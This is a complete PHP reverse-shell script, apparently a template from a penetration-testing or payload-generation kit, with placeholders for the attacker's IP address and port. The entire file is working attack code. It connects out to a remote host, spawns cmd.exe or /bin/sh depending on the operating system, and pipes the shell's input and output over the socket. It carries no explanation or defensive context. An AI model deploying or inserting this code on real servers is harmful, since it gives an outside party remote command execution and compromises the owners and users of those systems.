<?php
// Universal PHP Reverse Shell (Linux/Windows)
set_time_limit (0);
$VERSION = "1.1";
$ip = '__IPADDR__';
$port = __PORT__;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$daemon = 0;
$debug = 0;

// Detect OS and select shell
if (stripos(PHP_OS, 'WIN') !== false) {
    $shell = "cmd.exe";
} else {
    $shell = "/bin/sh -i";
}

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    print("ERROR: $errstr ($errno)");
    exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
    print("ERROR: Can't spawn shell");
    exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

print("Successfully opened reverse shell to $ip:$port");

while (1) {
    if (feof($sock)) {
        print("ERROR: Shell connection terminated");
        break;
    }
    if (feof($pipes[1])) {
        print("ERROR: Shell process terminated");
        break;
    }
    
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    
    if (in_array($sock, $read_a)) {
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }
    if (in_array($pipes[1], $read_a)) {
        $input = fread($pipes[1], $chunk_size);
        fwrite($sock, $input);
    }
    if (in_array($pipes[2], $read_a)) {
        $input = fread($pipes[2], $chunk_size);
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>

